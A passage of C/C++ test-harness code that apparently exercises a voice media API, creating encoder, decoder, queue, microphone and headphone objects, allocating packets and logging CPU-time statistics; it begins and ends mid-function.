    // pDecoderObject is the array of decoder objects
    XMediaObject            *pDecoderObject[MAX_DECODER];
    // pQueueObject is the array of queue objects
    XVoiceQueueMediaObject  *pQueueObject[MAX_QUEUE];
    // hEncoderResult is the result of the encoder object creation
    HRESULT                 hEncoderResult[MAX_ENCODER];
    // hDecoderResult is the result of the decoder object creation
    HRESULT                 hDecoderResult[MAX_DECODER];
    // hQueueResult is the result of the queue object creation
    HRESULT                 hQueueResult[MAX_QUEUE];
    // dwEncoderAttempts is the number of encoder object creation attempts
    DWORD                   dwEncoderAttempts[MAX_ENCODER];
    // dwDecoderAttempts is the number of decoder object creation attempts
    DWORD                   dwDecoderAttempts[MAX_DECODER];
    // dwQueueAttempts is the number of queue object creation attempts
    DWORD                   dwQueueAttempts[MAX_QUEUE];
    // dwTotalEncoderFailures is the number of total encoder object creation failures
    DWORD                   dwTotalEncoderFailures = 0;
    // dwTotalDecoderFailures is the number of total decoder object creation failures
    DWORD                   dwTotalDecoderFailures = 0;
    // dwTotalQueueFailures is the number of total queue object creation failures
    DWORD                   dwTotalQueueFailures = 0;
    // dwObject is a counter to enumerate each object
    DWORD                   dwObject;

    // bPassed is the result of this test
    BOOL                    bPassed = TRUE;



    // Set the numbers
    dwNumEncoder = __min(MAX_ENCODER, dwNumEncoder);
    dwNumDecoder = __min(MAX_DECODER, dwNumDecoder);
    dwNumQueue = __min(MAX_QUEUE, dwNumQueue);



    // Initialize the variables
    ZeroMemory(pEncoderObject, sizeof(pEncoderObject));
    ZeroMemory(pDecoderObject, sizeof(pDecoderObject));
    ZeroMemory(pQueueObject, sizeof(pQueueObject));



    // Initialize the wave format
    ZeroMemory(&wfxFormat, sizeof(wfxFormat));
    wfxFormat.wFormatTag = WAVE_FORMAT_PCM;
    wfxFormat.nChannels = 1;
    wfxFormat.nSamplesPerSec = VOICE_SAMPLING_RATE;
    wfxFormat.nAvgBytesPerSec = 2 * VOICE_SAMPLING_RATE;
    wfxFormat.nBlockAlign = 2;
    wfxFormat.wBitsPerSample = 16;
    wfxFormat.cbSize = 0;

    // Initialize the queue config
    ZeroMemory(&QueueConfig, sizeof(QueueConfig));
    QueueConfig.cbSize = sizeof(QueueConfig);
    QueueConfig.wVoiceSamplingRate = VOICE_SAMPLING_RATE;
    QueueConfig.dwCodecTag = dwCodecTag;
    QueueConfig.wMsOfDataPerPacket = wMsOfDataPerPacket;

    // Query the CPU times
    GetCpuTimes(&KernelTimeInitial, &InterruptTimeInitial, &DpcTimeInitial, &IdleTimeInitial);



    // Create the objects

    // Encoder
    for (dwObject = 0; dwObject < dwNumEncoder; dwObject++) {
        dwEncoderAttempts[dwObject] = 0;

        do {
            hEncoderResult[dwObject] = XVoiceEncoderCreateMediaObject(FALSE, dwCodecTag, &wfxFormat, MAX_THRESHOLD, &pEncoderObject[dwObject]);
            dwEncoderAttempts[dwObject]++;

            if (FAILED(hEncoderResult[dwObject])) {
                Sleep(200);
            }
        } while (FAILED(hEncoderResult[dwObject]));
    }

    // Decoder
    for (dwObject = 0; dwObject < dwNumDecoder; dwObject++) {
        dwDecoderAttempts[dwObject] = 0;

        do {
            hDecoderResult[dwObject] = XVoiceDecoderCreateMediaObject(dwCodecTag, &wfxFormat, &pDecoderObject[dwObject]);
            dwDecoderAttempts[dwObject]++;

            if (FAILED(hDecoderResult[dwObject])) {
                Sleep(200);
            }
        } while (FAILED(hDecoderResult[dwObject]));
    }

    // Queue
    for (dwObject = 0; dwObject < dwNumQueue; dwObject++) {
        dwQueueAttempts[dwObject] = 0;
        do {
            hQueueResult[dwObject] = XVoiceQueueCreateMediaObject(&QueueConfig, &pQueueObject[dwObject]);
            dwQueueAttempts[dwObject]++;

            if (FAILED(hQueueResult[dwObject])) {
                Sleep(200);
            }
        } while (FAILED(hQueueResult[dwObject]));
    }



    // Query the CPU times
    GetCpuTimes(&KernelTimeFinal, &InterruptTimeFinal, &DpcTimeFinal, &IdleTimeFinal);



    // Free the objects

    // Encoder
    for (dwObject = 0; dwObject < dwNumEncoder; dwObject++) {
        dwTotalEncoderFailures += dwEncoderAttempts[dwObject] - 1;
        *dwNumEncoderFailures += dwEncoderAttempts[dwObject] - 1;

        // Close the device
        pEncoderObject[dwObject]->Release();
    }

    // Decoder
    for (dwObject = 0; dwObject < dwNumDecoder; dwObject++) {
        dwTotalDecoderFailures += dwDecoderAttempts[dwObject] - 1;
        *dwNumDecoderFailures += dwDecoderAttempts[dwObject] - 1;

        // Close the device
        pDecoderObject[dwObject]->Release();
    }

    // Queue
    for (dwObject = 0; dwObject < dwNumQueue; dwObject++) {
        dwTotalQueueFailures += dwQueueAttempts[dwObject] - 1;
        *dwNumQueueFailures += dwQueueAttempts[dwObject] - 1;

        // Close the device
        pQueueObject[dwObject]->Release();
    }



    if (TRUE == bPassed) {
        // Log the stats
        LogStats(hLog, lpszTestName, dwTestIteration, KernelTimeInitial, KernelTimeFinal, InterruptTimeInitial, InterruptTimeFinal, DpcTimeInitial, DpcTimeFinal, IdleTimeInitial, IdleTimeFinal, NULL, NULL, &dwTotalEncoderFailures, &dwTotalDecoderFailures, &dwTotalQueueFailures);
        CalculateAndAddStatsDiff(KernelTimeInitial, KernelTimeFinal, InterruptTimeInitial, InterruptTimeFinal, DpcTimeInitial, DpcTimeFinal, IdleTimeInitial, IdleTimeFinal, KernelTimeDiff, InterruptTimeDiff, DpcTimeDiff, IdleTimeDiff);
    }

    return (TRUE == bPassed);
}



BOOL
MediaProcess(
    IN     HANDLE  hLog,
    IN     HANDLE  hMemObject,
    IN     LPSTR   lpszTestName,
    IN     DWORD   dwTestIteration,
    IN OUT ULONG   *KernelTimeDiff,
    IN OUT ULONG   *InterruptTimeDiff,
    IN OUT ULONG   *DpcTimeDiff,
    IN OUT ULONG   *IdleTimeDiff,
    IN OUT DWORD   *dwNumMicrophoneFailures,
    IN OUT DWORD   *dwNumHeadphoneFailures,
    IN OUT DWORD   *dwNumEncoderFailures,
    IN OUT DWORD   *dwNumDecoderFailures,
    IN OUT DWORD   *dwNumQueueFailures,
    IN     DWORD   dwNumMicrophones,
    IN     DWORD   dwNumHeadphones,
    IN     DWORD   dwNumEncoder,
    IN     DWORD   dwNumDecoder,
    IN     DWORD   dwNumQueue,
    IN     BOOL    bMix,
    IN     DWORD   dwCodecTag,
    IN     WORD    wNumPackets,
    IN     WORD    wMsOfDataPerPacket
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Processes media

Arguments:

  hLog - Handle to the log object
  hMemObject - Handle to the memory objet
  lpszTestName - Pointer to the test name
  dwTestIteration - Test iteration
  KernelTimeDiff - Diff kernel time
  InterruptTimeDiff - Diff interrupt time
  DpcTimeDiff - Diff dpc time
  IdleTimeDiff - Diff idle time
  dwNumMicrophoneFailures - Pointer to the number of microphone creation failures
  dwNumHeadphoneFailures - Pointer to the number of headphone creation failures
  dwNumEncoderFailures - Pointer to the number of encoder creation failures
  dwNumDecoderFailures - Pointer to the number of decoder creation failures
  dwNumQueueFailures - Pointer to the number of queue creation failures
  dwNumMicrophones - Specifies the number of microphone objects to create
  dwNumHeadphones - Specifies the number of headphone objects to create
  dwNumEncoder - Specifies the number of encoder objects to create
  dwNumDecoder - Specifies the number of decoder objects to create
  dwNumQueue - Specifies the number of queue objects to create
  bMix - Specifies if the output is mixed to a single buffer
  dwCodecTag - Specifies the codec
  dwNumPackets - Specifies the number of packets
  wMsOfDataPerPacket - Milliseconds of voice data per packet

Return Value:

  TRUE on success

------------------------------------------------------------------------------*/
{
    // KernelTimeInitial is the initial kernel time
    ULONG                   KernelTimeInitial;
    // KernelTimeFinal is the final kernel time
    ULONG                   KernelTimeFinal;
    // InterruptTimeInitial is the initial interrupt time
    ULONG                   InterruptTimeInitial;
    // InterruptTimeFinal is the final interrupt time
    ULONG                   InterruptTimeFinal;
    // DpcTimeInitial is the initial dpc time
    ULONG                   DpcTimeInitial;
    // DpcTimeFinal is the final dpc time
    ULONG                   DpcTimeFinal;
    // IdleTimeInitial is the initial idle time
    ULONG                   IdleTimeInitial;
    // IdleTimeFinal is the final idle time
    ULONG                   IdleTimeFinal;

    // pMicrophonePacket is the array of microphone packets
    XMEDIAPACKET            *pMicrophonePacket[MAX_MICROPHONE];
    // pHeadphonePacket is the array of headphone packets
    XMEDIAPACKET            *pHeadphonePacket[MAX_HEADPHONE];
    // pEncoderPacket is the encoder packet
    XMEDIAPACKET            *pEncoderPacket[MAX_ENCODER];
    // pDecoderPacket is the decoder packet
    XMEDIAPACKET            *pDecoderPacket[MAX_DECODER];
    // pQueuePacket is the queue packet
    XMEDIAPACKET            *pQueuePacket[MAX_QUEUE];
    // pQueuePacketInfo is the queue packet info
    PCM_INFO                *pQueuePacketInfo[MAX_QUEUE];
    // pMixPacket is the mixing packet
    XMEDIAPACKET            *pMixPacket = NULL;
    // wNumMixPackets is the number of packets in the mixing buffer
    WORD                    wNumMixPackets;
    // wValue is a counter to enumerate each value in the buffer
    WORD                    wValue;
    // fMixBuffer is a pointer to the mixing buffer
    FLOAT                   *fMixBuffer = NULL;
    // wEncoderSize is the size of the encoder packet buffer
    WORD                    wEncoderSize = 0;

    // hMicrophoneEvent is a handle to the microphone packet event
    HANDLE                  *hMicrophoneEvent[MAX_MICROPHONE];
    // hHeadphoneEvent is a handle to the headphone packet event
    HANDLE                  *hHeadphoneEvent[MAX_HEADPHONE];

    // wfxFormat is the wave format for the device
    WAVEFORMATEX            wfxFormat;
    // QueueConfig is the queue config for the object
    QUEUE_XMO_CONFIG        QueueConfig;
    // pMicrophoneObject is the array of microphone devices
    XMediaObject            *pMicrophoneObject[MAX_MICROPHONE];
    // pHeadphoneObject is the array of headphone devices
    XMediaObject            *pHeadphoneObject[MAX_HEADPHONE];
    // pEncoderObject is the encoder object
    XMediaObject            *pEncoderObject[MAX_ENCODER];
    // pDecoderObject is the decoder object
    XMediaObject            *pDecoderObject[MAX_DECODER];
    // pQueueObject is the array of queue objects
    XVoiceQueueMediaObject  *pQueueObject[MAX_QUEUE];

    // hMicrophoneResult is the result of the microphone device creation
    HRESULT                 hMicrophoneResult[MAX_MICROPHONE];
    // hHeadphoneResult is the result of the headphone device creation
    HRESULT                 hHeadphoneResult[MAX_HEADPHONE];
    // hEncoderResult is the result of the encoder object creation
    HRESULT                 hEncoderResult[MAX_ENCODER];
    // hDecoderResult is the result of the decoder object creation
    HRESULT                 hDecoderResult[MAX_DECODER];
    // hQueueResult is the result of the queue object creation
    HRESULT                 hQueueResult[MAX_QUEUE];
    // hResult is the result of an object operation
    HRESULT                 hResult;

    // dwMicrophoneAttempts is the number of microphone device creation attempts
    DWORD                   dwMicrophoneAttempts[MAX_MICROPHONE];
    // dwHeadphoneAttempts is the number of headphone device creation attempts
    DWORD                   dwHeadphoneAttempts[MAX_HEADPHONE];
    // dwEncoderAttempts is the number of encoder object creation attempts
    DWORD                   dwEncoderAttempts[MAX_ENCODER];
    // dwDecoderAttempts is the number of decoder object creation attempts
    DWORD                   dwDecoderAttempts[MAX_DECODER];
    // dwQueueAttempts is the number of queue object creation attempts
    DWORD                   dwQueueAttempts[MAX_QUEUE];
    // dwTotalMicrophoneFailures is the number of total microphone device creation failures
    DWORD                   dwTotalMicrophoneFailures = 0;
    // dwTotalHeadphoneFailures is the number of total headphone device creation failures
    DWORD                   dwTotalHeadphoneFailures = 0;
    // dwTotalEncoderFailures is the number of total encoder object creation failures
    DWORD                   dwTotalEncoderFailures = 0;
    // dwTotalDecoderFailures is the number of total decoder object creation failures
    DWORD                   dwTotalDecoderFailures = 0;
    // dwTotalQueueFailures is the number of total queue object creation failures
    DWORD                   dwTotalQueueFailures = 0;

    // dwObject is a counter to enumerate each object
    DWORD                   dwObject;
    // dwPacket is a counter to enumerate each packet
    DWORD                   dwPacket;

    // bPassed is the result of this test
    BOOL                    bPassed = TRUE;



    // Set the numbers
    dwNumMicrophones = __min(MAX_MICROPHONE, dwNumMicrophones);
    dwNumHeadphones = __min(MAX_HEADPHONE, dwNumHeadphones);
    dwNumEncoder = __min(MAX_ENCODER, dwNumEncoder);
    dwNumDecoder = __min(MAX_DECODER, dwNumDecoder);
    dwNumQueue = __min(MAX_QUEUE, dwNumQueue);



    // Initialize the variables
    ZeroMemory(pMicrophonePacket, sizeof(pMicrophonePacket));
    ZeroMemory(pHeadphonePacket, sizeof(pHeadphonePacket));
    ZeroMemory(pEncoderPacket, sizeof(pEncoderPacket));
    ZeroMemory(pDecoderPacket, sizeof(pDecoderPacket));    
    ZeroMemory(pQueuePacket, sizeof(pQueuePacket));
    ZeroMemory(pQueuePacketInfo, sizeof(pQueuePacketInfo));

    ZeroMemory(hMicrophoneEvent, sizeof(hMicrophoneEvent));
    ZeroMemory(hHeadphoneEvent, sizeof(hHeadphoneEvent));

    ZeroMemory(pMicrophoneObject, sizeof(pMicrophoneObject));
    ZeroMemory(pHeadphoneObject, sizeof(pHeadphoneObject));
    ZeroMemory(pEncoderObject, sizeof(pEncoderObject));
    ZeroMemory(pDecoderObject, sizeof(pDecoderObject));
    ZeroMemory(pQueueObject, sizeof(pQueueObject));



    // Initialize the wave format
    ZeroMemory(&wfxFormat, sizeof(wfxFormat));
    wfxFormat.wFormatTag = WAVE_FORMAT_PCM;
    wfxFormat.nChannels = 1;
    wfxFormat.nSamplesPerSec = VOICE_SAMPLING_RATE;
    wfxFormat.nAvgBytesPerSec = 2 * VOICE_SAMPLING_RATE;
    wfxFormat.nBlockAlign = 2;
    wfxFormat.wBitsPerSample = 16;
    wfxFormat.cbSize = 0;

    // Initialize the queue config
    ZeroMemory(&QueueConfig, sizeof(QueueConfig));
    QueueConfig.cbSize = sizeof(QueueConfig);
    QueueConfig.wVoiceSamplingRate = VOICE_SAMPLING_RATE;
    QueueConfig.dwCodecTag = dwCodecTag;
    QueueConfig.wMsOfDataPerPacket = wMsOfDataPerPacket;
    QueueConfig.wMaxDelay = wNumPackets * wMsOfDataPerPacket;



    // Create the devices and objects

    // Microphone
    for (dwObject = 0; dwObject < (sizeof(pMicrophoneObject) / sizeof(pMicrophoneObject[0])); dwObject++) {
        dwMicrophoneAttempts[dwObject] = 0;

        do {
            hMicrophoneResult[dwObject] = XVoiceCreateMediaObject(XDEVICE_TYPE_VOICE_MICROPHONE, dwObject, wNumPackets, &wfxFormat, &pMicrophoneObject[dwObject]);
            dwMicrophoneAttempts[dwObject]++;

            if (FAILED(hMicrophoneResult[dwObject])) {
                Sleep(200);
            }
        } while (FAILED(hMicrophoneResult[dwObject]));
    }

    // Headphone
    for (dwObject = 0; dwObject < (sizeof(pHeadphoneObject) / sizeof(pHeadphoneObject[0])); dwObject++) {
        dwHeadphoneAttempts[dwObject] = 0;

        do {
            hHeadphoneResult[dwObject] = XVoiceCreateMediaObject(XDEVICE_TYPE_VOICE_HEADPHONE, dwObject, wNumPackets, &wfxFormat, &pHeadphoneObject[dwObject]);
            dwHeadphoneAttempts[dwObject]++;

            if (FAILED(hHeadphoneResult[dwObject])) {
                Sleep(200);
            }
        } while (FAILED(hHeadphoneResult[dwObject]));
    }

    // Encoder
    for (dwObject = 0; dwObject < (sizeof(pEncoderObject) / sizeof(pEncoderObject[0])); dwObject++) {
        dwEncoderAttempts[dwObject] = 0;

        do {
            hEncoderResult[dwObject] = XVoiceEncoderCreateMediaObject(FALSE, dwCodecTag, &wfxFormat, MAX_THRESHOLD, &pEncoderObject[dwObject]);
            dwEncoderAttempts[dwObject]++;

            if (FAILED(hEncoderResult[dwObject])) {
                Sleep(200);
            }
        } while (FAILED(hEncoderResult[dwObject]));
    }

    // Decoder
    for (dwObject = 0; dwObject < (sizeof(pDecoderObject) / sizeof(pDecoderObject[0])); dwObject++) {
        dwDecoderAttempts[dwObject] = 0;

        do {
            hDecoderResult[dwObject] = XVoiceDecoderCreateMediaObject(dwCodecTag, &wfxFormat, &pDecoderObject[dwObject]);
            dwDecoderAttempts[dwObject]++;

            if (FAILED(hDecoderResult[dwObject])) {
                Sleep(200);
            }
        } while (FAILED(hDecoderResult[dwObject]));
    }


    // Queue
    for (dwObject = 0; dwObject < (sizeof(pQueueObject) / sizeof(pQueueObject[0])); dwObject++) {
        dwQueueAttempts[dwObject] = 0;

        do {
            hQueueResult[dwObject] = XVoiceQueueCreateMediaObject(&QueueConfig, &pQueueObject[dwObject]);
            dwQueueAttempts[dwObject]++;

            if (FAILED(hQueueResult[dwObject])) {
                Sleep(200);
            }
        } while (FAILED(hQueueResult[dwObject]));
    }



    // Determine the codec buffer size
    XVoiceGetCodecBufferSize(pEncoderObject[0], VOICE_BYTES_PER_MS * wMsOfDataPerPacket, &wEncoderSize);



    // Create the packets

    // Microphone
    for (dwObject = 0; dwObject < (sizeof(pMicrophoneObject) / sizeof(pMicrophoneObject[0])); dwObject++) {
        pMicrophonePacket[dwObject] = (XMEDIAPACKET *) xMemAlloc(hMemObject, (sizeof(XMEDIAPACKET) + sizeof(DWORD) * 2 + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets);
        if (NULL == pMicrophonePacket[dwObject]) {
            Log_va(hLog, TRUE, "%s: pMicrophonePacket [%d] memory allocation failed, ec = 0x%08x\r\n", lpszTestName, dwObject, GetLastError());

            bPassed = FALSE;

            goto ExitTest;
        }
    }

    // Headphone
    for (dwObject = 0; dwObject < (sizeof(pHeadphoneObject) / sizeof(pHeadphoneObject[0])); dwObject++) {
        pHeadphonePacket[dwObject] = (XMEDIAPACKET *) xMemAlloc(hMemObject, (sizeof(XMEDIAPACKET) + sizeof(DWORD) * 2 + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets);
        if (NULL == pHeadphonePacket[dwObject]) {
            Log_va(hLog, TRUE, "%s: pHeadphonePacket [%d] memory allocation failed, ec = 0x%08x\r\n", lpszTestName, dwObject, GetLastError());

            bPassed = FALSE;

            goto ExitTest;
        }
    }

    // Encoder
    for (dwObject = 0; dwObject < (sizeof(pEncoderObject) / sizeof(pEncoderObject[0])); dwObject++) {
        pEncoderPacket[dwObject] = (XMEDIAPACKET *) xMemAlloc(hMemObject, (sizeof(XMEDIAPACKET) + sizeof(DWORD) * 2 + wEncoderSize) * wNumPackets);
        if (NULL == pEncoderPacket[dwObject]) {
            Log_va(hLog, TRUE, "%s: pEncoderPacket [%d] memory allocation failed, ec = 0x%08x\r\n", lpszTestName, dwObject, GetLastError());

            bPassed = FALSE;

            goto ExitTest;
        }
    }

    // Decoder
    for (dwObject = 0; dwObject < (sizeof(pDecoderObject) / sizeof(pDecoderObject[0])); dwObject++) {
        pDecoderPacket[dwObject] = (XMEDIAPACKET *) xMemAlloc(hMemObject, (sizeof(XMEDIAPACKET) + sizeof(DWORD) * 2 + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets);
        if (NULL == pDecoderPacket[dwObject]) {
            Log_va(hLog, TRUE, "%s: pDecoderPacket [%d] memory allocation failed, ec = 0x%08x\r\n", lpszTestName, dwObject, GetLastError());

            bPassed = FALSE;

            goto ExitTest;
        }
    }

    // Queue
    for (dwObject = 0; dwObject < (sizeof(pQueueObject) / sizeof(pQueueObject[0])); dwObject++) {
        pQueuePacket[dwObject] = (XMEDIAPACKET *) xMemAlloc(hMemObject, (sizeof(XMEDIAPACKET) + sizeof(DWORD) * 2 + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets);
        if (NULL == pQueuePacket[dwObject]) {
            Log_va(hLog, TRUE, "%s: pQueuePacket [%d] memory allocation failed, ec = 0x%08x\r\n", lpszTestName, dwObject, GetLastError());

            bPassed = FALSE;

            goto ExitTest;
        }

        pQueuePacketInfo[dwObject] = (PCM_INFO *) xMemAlloc(hMemObject, sizeof(PCM_INFO) * wNumPackets);
        if (NULL == pQueuePacketInfo[dwObject]) {
            Log_va(hLog, TRUE, "%s: pQueuePacketInfo [%d] memory allocation failed, ec = 0x%08x\r\n", lpszTestName, dwObject, GetLastError());

            bPassed = FALSE;

            goto ExitTest;
        }
    }

    // Mixing packet
    pMixPacket = (XMEDIAPACKET *) xMemAlloc(hMemObject, (sizeof(XMEDIAPACKET) + sizeof(DWORD) * 2 + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets);
    if (NULL == pMixPacket) {
        Log_va(hLog, TRUE, "%s: pMixPacket memory allocation failed, ec = 0x%08x\r\n", lpszTestName, GetLastError());

        bPassed = FALSE;

        goto ExitTest;
    }

    // Mixing buffer
    fMixBuffer = (FLOAT *) xMemAlloc(hMemObject, sizeof(FLOAT) * VOICE_BYTES_PER_MS * wMsOfDataPerPacket / sizeof(SHORT));
    if (NULL == fMixBuffer) {
        Log_va(hLog, TRUE, "%s: fMixBuffer memory allocation failed, ec = 0x%08x\r\n", lpszTestName, GetLastError());

        bPassed = FALSE;

        goto ExitTest;
    }



    // Initialize the events

    // Microphone
    for (dwObject = 0; dwObject < (sizeof(pMicrophoneObject) / sizeof(pMicrophoneObject[0])); dwObject++) {
        hMicrophoneEvent[dwObject] = (HANDLE *) xMemAlloc(hMemObject, sizeof(HANDLE) * wNumPackets);
        if (NULL == hMicrophoneEvent[dwObject]) {
            Log_va(hLog, TRUE, "%s: hMicrophoneEvent [%d] memory allocation failed, ec = 0x%08x\r\n", lpszTestName, dwObject, GetLastError());

            bPassed = FALSE;

            goto ExitTest;
        }

        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            hMicrophoneEvent[dwObject][dwPacket] = CreateEvent(NULL, FALSE, FALSE, NULL);
            if (NULL == hMicrophoneEvent[dwObject][dwPacket]) {
                Log_va(hLog, TRUE, "%s: hMicrophoneEvent [%d][%d] event failed, ec = 0x%08x\r\n", lpszTestName, dwObject, dwPacket, GetLastError());

                bPassed = FALSE;

                goto ExitTest;
            }
        }
    }

    // Headphone
    for (dwObject = 0; dwObject < (sizeof(pHeadphoneObject) / sizeof(pHeadphoneObject[0])); dwObject++) {
        hHeadphoneEvent[dwObject] = (HANDLE *) xMemAlloc(hMemObject, sizeof(HANDLE) * wNumPackets);
        if (NULL == hHeadphoneEvent[dwObject]) {
            Log_va(hLog, TRUE, "%s: hHeadphoneEvent [%d] memory allocation failed, ec = 0x%08x\r\n", lpszTestName, dwObject, GetLastError());

            bPassed = FALSE;

            goto ExitTest;
        }

        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            hHeadphoneEvent[dwObject][dwPacket] = CreateEvent(NULL, FALSE, FALSE, NULL);
            if (NULL == hHeadphoneEvent[dwObject][dwPacket]) {
                Log_va(hLog, TRUE, "%s: hHeadphoneEvent [%d][%d] event failed, ec = 0x%08x\r\n", lpszTestName, dwObject, dwPacket, GetLastError());

                bPassed = FALSE;

                goto ExitTest;
            }
        }
    }



    // Initialize the packets

    // Microphone
    for (dwObject = 0; dwObject < (sizeof(pMicrophoneObject) / sizeof(pMicrophoneObject[0])); dwObject++) {
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            pMicrophonePacket[dwObject][dwPacket].pvBuffer = (XMEDIAPACKET *) ((BYTE *) pMicrophonePacket[dwObject] + sizeof(XMEDIAPACKET) * wNumPackets + VOICE_BYTES_PER_MS * wMsOfDataPerPacket * dwPacket);
            pMicrophonePacket[dwObject][dwPacket].dwMaxSize = VOICE_BYTES_PER_MS * wMsOfDataPerPacket;
            pMicrophonePacket[dwObject][dwPacket].pdwCompletedSize = (LPDWORD) ((BYTE *) pMicrophonePacket[dwObject] + (sizeof(XMEDIAPACKET) + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets + sizeof(DWORD) * 2 * dwPacket);
            pMicrophonePacket[dwObject][dwPacket].pdwStatus = (LPDWORD) ((BYTE *) pMicrophonePacket[dwObject] + (sizeof(XMEDIAPACKET) + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets + sizeof(DWORD) * ( 2 * dwPacket + 1));
            pMicrophonePacket[dwObject][dwPacket].hCompletionEvent = hMicrophoneEvent[dwObject][dwPacket];
        }
    }

    // Headphone
    for (dwObject = 0; dwObject < (sizeof(pHeadphoneObject) / sizeof(pHeadphoneObject[0])); dwObject++) {
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            pHeadphonePacket[dwObject][dwPacket].pvBuffer = (XMEDIAPACKET *) ((BYTE *) pHeadphonePacket[dwObject] + sizeof(XMEDIAPACKET) * wNumPackets + VOICE_BYTES_PER_MS * wMsOfDataPerPacket * dwPacket);
            pHeadphonePacket[dwObject][dwPacket].dwMaxSize = VOICE_BYTES_PER_MS * wMsOfDataPerPacket;
            pHeadphonePacket[dwObject][dwPacket].pdwCompletedSize = (LPDWORD) ((BYTE *) pHeadphonePacket[dwObject] + (sizeof(XMEDIAPACKET) + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets + sizeof(DWORD) * 2 * dwPacket);
            pHeadphonePacket[dwObject][dwPacket].pdwStatus = (LPDWORD) ((BYTE *) pHeadphonePacket[dwObject] + (sizeof(XMEDIAPACKET) + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets + sizeof(DWORD) * ( 2 * dwPacket + 1));
            pHeadphonePacket[dwObject][dwPacket].hCompletionEvent = hHeadphoneEvent[dwObject][dwPacket];
        }
    }

    // Encoder
    for (dwObject = 0; dwObject < (sizeof(pEncoderObject) / sizeof(pEncoderObject[0])); dwObject++) {
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            pEncoderPacket[dwObject][dwPacket].pvBuffer = (XMEDIAPACKET *) ((BYTE *) pEncoderPacket[dwObject] + sizeof(XMEDIAPACKET) * wNumPackets + wEncoderSize * dwPacket);
            pEncoderPacket[dwObject][dwPacket].dwMaxSize = wEncoderSize;
            pEncoderPacket[dwObject][dwPacket].pdwCompletedSize = (LPDWORD) ((BYTE *) pEncoderPacket[dwObject] + (sizeof(XMEDIAPACKET) + wEncoderSize) * wNumPackets + sizeof(DWORD) * 2 * dwPacket);
            pEncoderPacket[dwObject][dwPacket].pdwStatus = (LPDWORD) ((BYTE *) pEncoderPacket[dwObject] + (sizeof(XMEDIAPACKET) + wEncoderSize) * wNumPackets + sizeof(DWORD) * ( 2 * dwPacket + 1));
        }
    }

    // Decoder
    for (dwObject = 0; dwObject < (sizeof(pDecoderObject) / sizeof(pDecoderObject[0])); dwObject++) {
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            pDecoderPacket[dwObject][dwPacket].pvBuffer = (XMEDIAPACKET *) ((BYTE *) pDecoderPacket[dwObject] + sizeof(XMEDIAPACKET) * wNumPackets + VOICE_BYTES_PER_MS * wMsOfDataPerPacket * dwPacket);
            pDecoderPacket[dwObject][dwPacket].dwMaxSize = VOICE_BYTES_PER_MS * wMsOfDataPerPacket;
            pDecoderPacket[dwObject][dwPacket].pdwCompletedSize = (LPDWORD) ((BYTE *) pDecoderPacket[dwObject] + (sizeof(XMEDIAPACKET) + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets + sizeof(DWORD) * 2 * dwPacket);
            pDecoderPacket[dwObject][dwPacket].pdwStatus = (LPDWORD) ((BYTE *) pDecoderPacket[dwObject] + (sizeof(XMEDIAPACKET) + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets + sizeof(DWORD) * ( 2 * dwPacket + 1));
        }
    }

    // Queue
    for (dwObject = 0; dwObject < (sizeof(pQueueObject) / sizeof(pQueueObject[0])); dwObject++) {
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            pQueuePacket[dwObject][dwPacket].pvBuffer = (XMEDIAPACKET *) ((BYTE *) pQueuePacket[dwObject] + sizeof(XMEDIAPACKET) * wNumPackets + VOICE_BYTES_PER_MS * wMsOfDataPerPacket * dwPacket);
            pQueuePacket[dwObject][dwPacket].dwMaxSize = VOICE_BYTES_PER_MS * wMsOfDataPerPacket;
            pQueuePacket[dwObject][dwPacket].pdwCompletedSize = (LPDWORD) ((BYTE *) pQueuePacket[dwObject] + (sizeof(XMEDIAPACKET) + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets + sizeof(DWORD) * 2 * dwPacket);
            pQueuePacket[dwObject][dwPacket].pdwStatus = (LPDWORD) ((BYTE *) pQueuePacket[dwObject] + (sizeof(XMEDIAPACKET) + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets + sizeof(DWORD) * ( 2 * dwPacket + 1));

            pQueuePacketInfo[dwObject][dwPacket].cbSize = sizeof(pQueuePacketInfo[dwObject][dwPacket]);
        }
    }

    // Mixing packet
    for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
        pMixPacket[dwPacket].pvBuffer = (XMEDIAPACKET *) ((BYTE *) pMixPacket + sizeof(XMEDIAPACKET) * wNumPackets + VOICE_BYTES_PER_MS * wMsOfDataPerPacket * dwPacket);
        pMixPacket[dwPacket].dwMaxSize = VOICE_BYTES_PER_MS * wMsOfDataPerPacket;
        pMixPacket[dwPacket].pdwCompletedSize = (LPDWORD) ((BYTE *) pMixPacket + (sizeof(XMEDIAPACKET) + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets + sizeof(DWORD) * 2 * dwPacket);
        pMixPacket[dwPacket].pdwStatus = (LPDWORD) ((BYTE *) pMixPacket + (sizeof(XMEDIAPACKET) + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets + sizeof(DWORD) * ( 2 * dwPacket + 1));
    }



    // Seed the microphone packets
    for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
        pMicrophoneObject[0]->Process(NULL, &pMicrophonePacket[0][dwPacket]);
    }

    // Wait for the microphone packets
    for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
